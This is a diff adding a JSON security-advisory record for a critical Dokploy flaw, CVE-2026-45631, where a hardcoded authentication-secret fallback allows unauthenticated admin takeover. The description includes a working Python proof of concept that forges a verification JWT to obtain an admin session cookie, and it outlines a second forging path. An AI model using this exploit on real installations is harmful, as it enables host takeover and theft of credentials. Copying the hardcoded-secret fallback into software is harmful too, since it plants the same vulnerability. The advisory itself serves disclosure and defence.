@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-w3gm-rc4p-9rhj",
+  "repo": {
+    "cve_id": "CVE-2026-45631",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 10,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-798"
+    ],
+    "description": "## Summary\r\n\r\nHardcoded `BETTER_AUTH_SECRET` fallback (`\"better-auth-secret-123456789\"`) lets an unauthenticated attacker forge email verification JWTs, trigger auto-sign-in as admin, and execute commands on the host via the built-in SSH terminal.\r\n\r\n## Details\r\n\r\n`packages/server/src/constants/index.ts:88-89`:\r\n```typescript\r\nexport const BETTER_AUTH_SECRET =\r\n    process.env.BETTER_AUTH_SECRET || \"better-auth-secret-123456789\";\r\n```\r\n\r\nThe install script never sets this env var. All default self-hosted instances share the same signing secret.\r\n\r\nbetter-auth verifies email verification tokens by HS256 signature only (no DB lookup). When verification succeeds, `autoSignInAfterVerification: true` creates a database session and sets a session cookie. The `emailVerified` early-return guard does not trigger because self-hosted admin users register with `emailVerified: false` (no verification email is ever sent).\r\n\r\nSecond path: forge JWT with `requestType: \"change-email-verification\"` + `updateTo: \"attacker@evil.com\"` -- works even if `emailVerified: true`.\r\n\r\n## PoC\r\n\r\n```python\r\nimport jwt, time, requests\r\n\r\nSECRET = \"better-auth-secret-123456789\"\r\nTARGET = \"https://dokploy.example.com\"\r\nADMIN_EMAIL = \"admin@example.com\"\r\n\r\ntoken = jwt.encode(\r\n    {\"email\": ADMIN_EMAIL, \"iat\": int(time.time()), \"exp\": int(time.time()) + 3600},\r\n    SECRET, algorithm=\"HS256\"\r\n)\r\n\r\ns = requests.Session()\r\nr = s.get(f\"{TARGET}/api/auth/verify-email?token={token}\")\r\nprint(s.cookies)  # better-auth.session_token = admin session\r\n```\r\n\r\nFull E2E test (Docker, default install, signup + forge + verify) available on request.\r\n\r\n## Impact\r\n\r\nUnauthenticated remote attacker gains full admin control of any default Dokploy installation. Admin access = RCE on host via SSH terminal, access to all hosted apps/databases/secrets, stored SSH keys, and registry credentials.",
+    "ghsa_id": "GHSA-w3gm-rc4p-9rhj",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-w3gm-rc4p-9rhj",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-w3gm-rc4p-9rhj"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-45631"
+      }
+    ],
+    "published_at": "2026-05-11T18:37:12Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Pre-Auth Admin Takeover via Hardcoded Authentication Secret ",
+    "updated_at": "2026-05-13T04:35:30Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "dokploy"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": ">= 0.27.0, <= 0.28.8"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
